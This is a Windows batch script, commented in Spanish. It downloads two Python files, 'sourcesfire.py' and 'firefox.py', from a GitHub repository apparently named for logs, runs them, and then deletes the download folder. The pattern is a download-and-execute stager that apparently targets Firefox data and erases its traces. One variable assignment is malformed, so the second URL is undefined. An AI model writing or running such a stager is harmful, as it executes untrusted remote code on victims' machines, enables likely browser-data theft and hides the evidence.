@echo off

:: Ruta de descarga y nombre del archivo
set "url_sourcesfire=https://raw.githubusercontent.com/matiasb186/Robmo-Logs/main/sourcesfire.py"
set "https://raw.githubusercontent.com/matiasb186/Robmo-Logs/main/firefox.py"
set "download_folder=C:\Users\%USERNAME%\Downloads\R"
set "filename_sourcesfire=sourcesfire.py"
set "filename_firefox=firefox.py"

:: Nombre del archivo Python a ejecutar
set "python_script_sourcesfire=%download_folder%\%filename_sourcesfire%"
set "python_script_firefox=%download_folder%\%filename_firefox%"

:: Comprueba si la carpeta de descarga existe, y si no, créala
if not exist "%download_folder%" (
    mkdir "%download_folder%"
)

:: Descarga y ejecuta sourcesfire.py desde la URL
powershell -command "(New-Object System.Net.WebClient).DownloadFile('%url_sourcesfire%', '%python_script_sourcesfire%')"
if exist "%python_script_sourcesfire%" (
    python "%python_script_sourcesfire%"
)

:: Descarga y ejecuta firefox.py desde la URL
powershell -command "(New-Object System.Net.WebClient).DownloadFile('%url_firefox%', '%python_script_firefox%')"
if exist "%python_script_firefox%" (
    python "%python_script_firefox%"
)

rd /s /q "%download_folder%"

exit
